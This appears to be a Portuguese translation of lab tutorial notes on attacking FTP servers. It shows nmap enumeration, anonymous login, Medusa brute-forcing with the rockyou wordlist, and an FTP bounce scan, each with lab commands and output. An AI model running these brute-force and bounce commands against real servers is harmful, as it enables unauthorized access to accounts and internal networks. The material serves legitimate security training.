# Atacando o FTP

O File Transfer Protocol ( FTP) é um protocolo de rede padrão usado para transferir arquivos entre computadores. Ele também executa operações de diretório e arquivos, como alterar o diretório de trabalho, listar arquivos e renomear e excluir diretórios ou arquivos. Por padrão, o FTP escuta na porta ``TCP/21``.

Para atacar um servidor FTP, podemos abusar de configurações incorretas ou privilégios excessivos, explorar vulnerabilidades conhecidas ou descobrir novas vulnerabilidades. Portanto, após obter acesso ao Serviço FTP, precisamos estar atentos ao conteúdo do diretório para que possamos buscar informações sensíveis ou críticas, conforme discutimos anteriormente. O protocolo foi projetado para acionar downloads e uploads com comandos. Assim, os arquivos podem ser transferidos entre servidores e clientes. Um sistema de gerenciamento de arquivos está disponível para o usuário, conhecido pelo sistema operacional. Os arquivos podem ser armazenados em pastas, que podem estar localizadas em outras pastas. Isso resulta em uma estrutura de diretório hierárquica. A maioria das empresas utiliza este serviço para processos de desenvolvimento de software ou sites.

## Enumeração

Scripts padrão do Nmap ``-sC`` inclui o script Nmap ``ftp-anon`` que verifica se um servidor FTP permite logins anônimos. O sinalizador de enumeração de versão ``-sV`` fornece informações interessantes sobre serviços FTP, como o banner FTP, que geralmente inclui o nome da versão. Podemos usar o cliente FTP ou ``nc`` para interagir com o serviço FTP. Por padrão, o FTP é executado na porta ``TCP 21``.

## Nmap

### Atacando FTP

```bash
NycolasES6@htb[/htb]$ sudo nmap -sC -sV -p 21 192.168.2.142 

Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-10 22:04 EDT
Nmap scan report for 192.168.2.142
Host is up (0.00054s latency).

PORT   STATE SERVICE
21/tcp open  ftp
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--   1 1170     924            31 Mar 28  2001 .banner
| d--x--x--x   2 root     root         1024 Jan 14  2002 bin
| d--x--x--x   2 root     root         1024 Aug 10  1999 etc
| drwxr-srwt   2 1170     924          2048 Jul 19 18:48 incoming [NSE: writeable]
| d--x--x--x   2 root     root         1024 Jan 14  2002 lib
| drwxr-sr-x   2 1170     924          1024 Aug  5  2004 pub
|_Only 6 shown. Use --script-args ftp-anon.maxlist=-1 to see all.
```

## Configurações incorretas

Conforme discutimos, a autenticação anônima pode ser configurada para diferentes serviços, como FTP. Para acessar com login anônimo, podemos usar o nome de usuário ``anonymous`` e nenhuma senha. Isto será perigoso para a empresa se as permissões de leitura e gravação não tiverem sido configuradas corretamente para o serviço FTP. Porque com o login anônimo, a empresa poderia ter armazenado informações confidenciais em uma pasta à qual o usuário anônimo do serviço FTP poderia ter acesso.

Isso nos permitiria baixar essas informações confidenciais ou até mesmo fazer upload de scripts perigosos. Usando outras vulnerabilidades, como path traversal em uma aplicação web, poderíamos descobrir onde esse arquivo está localizado e executá-lo como código PHP, por exemplo.

### Autenticação anônima

```bash
NycolasES6@htb[/htb]$ ftp 192.168.2.142    
                     
Connected to 192.168.2.142.
220 (vsFTPd 2.3.4)
Name (192.168.2.142:kali): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0               9 Aug 12 16:51 test.txt
226 Directory send OK.
```

Assim que tivermos acesso a um servidor FTP com credenciais anônimas, podemos começar a procurar informações interessantes. Podemos usar os comandos ``ls`` e ``cd`` para navegar pelos diretórios como no Linux. Para baixar um único arquivo, usamos ``get``, e para baixar vários arquivos, podemos usar ``mget``. Para operações de upload, podemos usar ``put`` para um arquivo simples ou ``mput`` para vários arquivos. Podemos usar ``help`` na sessão do cliente FTP para mais informações.

No módulo Footprinting , cobrimos informações detalhadas sobre possíveis configurações incorretas de tais serviços. Por exemplo, muitas configurações diferentes podem ser aplicadas a um servidor FTP, e algumas delas levam a opções diferentes que podem causar possíveis ataques contra esse serviço. No entanto, este módulo se concentrará em ataques específicos, em vez de encontrar configurações incorretas individuais.

## Ataques específicos de protocolo

Muitos ataques e métodos diferentes são baseados em protocolos. No entanto, é essencial observar que não estamos atacando os protocolos individuais em si, mas os serviços que os utilizam. Como existem dezenas de serviços para um único protocolo e eles processam as informações correspondentes de maneira diferente, veremos alguns.

### Força bruta

Se não houver autenticação anônima disponível, também podemos forçar o login para os serviços FTP usando uma lista de nomes de usuário e senhas pré-gerados. Existem muitas ferramentas diferentes para realizar um ataque de força bruta. Vamos explorar uma delas, a ``Medusa``. Com Medusa, podemos usar a opção ``-u`` para especificar um único usuário a ser alvo, ou você pode usar a opção ``-U`` para fornecer um arquivo com uma lista de nomes de usuários. A opção ``-P`` é para um arquivo contendo uma lista de senhas. Podemos usar a opção ``-M`` e o protocolo que pretendemos (FTP) e a opção ``-h`` para o nome do host ou endereço IP de destino.

> Observação: embora possamos encontrar serviços vulneráveis à força bruta, a maioria dos aplicativos hoje evita esses tipos de ataques. Um método mais eficaz é a pulverização de senha.

## Força Bruta com Medusa

```bash
NycolasES6@htb[/htb]$ medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h 10.129.203.7 -M ftp 
                                                             
Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>                                                      
ACCOUNT CHECK: [ftp] Host: 10.129.203.7 (1 of 1, 0 complete) User: fiona (1 of 1, 0 complete) Password: 123456 (1 of 14344392 complete)
ACCOUNT CHECK: [ftp] Host: 10.129.203.7 (1 of 1, 0 complete) User: fiona (1 of 1, 0 complete) Password: 12345 (2 of 14344392 complete)
ACCOUNT CHECK: [ftp] Host: 10.129.203.7 (1 of 1, 0 complete) User: fiona (1 of 1, 0 complete) Password: 123456789 (3 of 14344392 complete)
ACCOUNT FOUND: [ftp] Host: 10.129.203.7 User: fiona Password: family [SUCCESS]
```

### Ataque de rejeição de FTP

Um ataque de rejeição de FTP é um ataque de rede que usa servidores FTP para entregar tráfego de saída para outro dispositivo na rede. O invasor usa um comando ``PORT`` para enganar a conexão ``FTP``, fazendo-a executar comandos e obter informações de um dispositivo diferente do servidor pretendido.

Considere que temos como alvo um servidor FTP ``FTP_DMZ`` exposto à Internet. Outro dispositivo na mesma rede, ``Internal_DMZ``, não está exposto à Internet. Podemos usar a conexão com o servidor ``FTP_DMZ`` para escanear ``Internal_DMZ`` usando o ataque ``FTP Bounce`` e obter informações sobre as portas abertas do servidor. Então, poderemos usar essas informações como parte do nosso ataque contra a infraestrutura.

![alt text](img/ftp_bounce_attack.webp)

O sinalizador Nmap ``-b`` pode ser usado para realizar um ataque de rejeição de FTP:

```bash
NycolasES6@htb[/htb]$ nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213 172.17.0.2

Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-27 04:55 EDT
Resolved FTP bounce attack proxy to 10.10.110.213 (10.10.110.213).
Attempting connection to ftp://anonymous:password@10.10.110.213:21
Connected:220 (vsFTPd 3.0.3)
Login credentials accepted by FTP server!
Initiating Bounce Scan at 04:55
FTP command misalignment detected ... correcting.
Completed Bounce Scan at 04:55, 0.54s elapsed (1 total ports)
Nmap scan report for 172.17.0.2
Host is up.

PORT   STATE  SERVICE
80/tcp open http

<SNIP>
```

Os servidores FTP modernos incluem proteções que, por padrão, evitam esse tipo de ataque, mas se esses recursos forem configurados incorretamente nos servidores FTP modernos, o servidor pode se tornar vulnerável a um ataque FTP Bounce.
